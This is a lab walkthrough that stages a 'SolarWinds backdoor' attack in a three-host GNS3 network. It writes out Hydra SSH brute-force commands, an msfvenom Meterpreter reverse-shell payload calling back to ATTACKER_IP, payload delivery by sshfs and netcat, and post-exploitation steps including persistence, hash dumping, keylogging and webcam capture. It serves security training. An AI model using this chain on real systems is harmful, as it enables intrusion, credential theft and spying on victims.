# Solarwinds backdoor affair

- Creation of 3 hosts (using *GNS3 Lab*):
    - **Orion server**
    - **Client (Victim)**
    - **Attacker**

They all are in the same LAN.

### SSH Password Cracking

- **Tool: Hydra**

- **Type of attack: dictionary attack**

- *bruteforcing only password*

    >hydra -l \<username\> -P \<path to wordlist\> \<IP\> ssh

    *where \<path to wordlist\> is a list of passwords to check*

- *bruteforcing only username*

    >hydra -L \<path to wordlist\> -p \<password\> \<IP\> ssh

    *where \<path to wordlist\> is a list of usernames to check*

- *bruteforcing both user*name and password*

    >hydra -L \<path to wordlist1\> -P \<path to wordlist2\> \<IP\> ssh

    *where \<path to wordlist1\> is a list of usernames and \<path to wordlist2\> is a list of passwords*


### Backdoor

- **Tool: msfvenom (metasploit), sshfs, ssh**

- *creation of the backdoor (to do on the attacker host)*

    >msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=\<ATTACKER_IP\> LPORT=\<PORT\> -f elf > filename.elf

- *move the backdoor executable filename.elf (generated in the previous step) from the attacker's host file system to the Orion Server file system using sshfs*

    - *mount the Orion server FS on the attacker's host FS*

        >sshfs \<SERVER_USERNAME\>@\<SERVER_IP\>:/root/node/to/mount /attacker/folder/with/mount
    
    - *move or copy the executable*

    - *unmount the Orion Server FS*

        >fusermount -u /attacker/folder/with/mount


- *access to the Orion Server from the attacker host with ssh (since you know the ssh password)*
    >ssh \<SERVER_IP\>

- *send the executable using netcat*

    - *open a listening socket on client host (victim)*

        >nc -l -p \<PORT\> > /path/dest/executable
    
    - *send the file from the attacker host*

        >cat /path/where/to/find/executable | nc \<VICTIM_IP\> \<PORT\>

- *execute the backdoor*

    - *open a multi handler server on the attacker machine*

        >msfconsole
        
        >use exploit/multi/handler

        >set payload linux/x86/meterpreter/reverse_tcp

        >set LHOST \<ATTACKER_IP\>

        >set LPORT \<PORT\> (the same port used when creating the backdoor payload with msfvenom)

        >exploit
    
    - *execute the backdoor file on the victim machine*
    
    - *while the executable is running (on the victim), the attacker can do many things:*

        - *get information system*

            >sysinfo
        
        - *upload/download of file (to/from the victim's FS)*

            >download /path/to/file
            
            >upload /path/to/file
        
        - *managing the victim's FS with the usual linux terminal commands*

        - *controlling the victim's network (and sniffing it)*

        - *make **privilege escalation attack** to get root privileges*

        - *make the backdoor persistent (also at reboot)*

            >run persistence -U -p \<PORT\> -r \<ATTACKER_IP\>
        
        - *get the passwords dump*

            >run post/linux/gather/hashdump
        
        - *activate and stop a keylogger (and then also see the catched keys)*

        - *do a screenshot or record the webcam (if available)*

            >screenshot

            >webcam_list
            
            >webcam_snap
            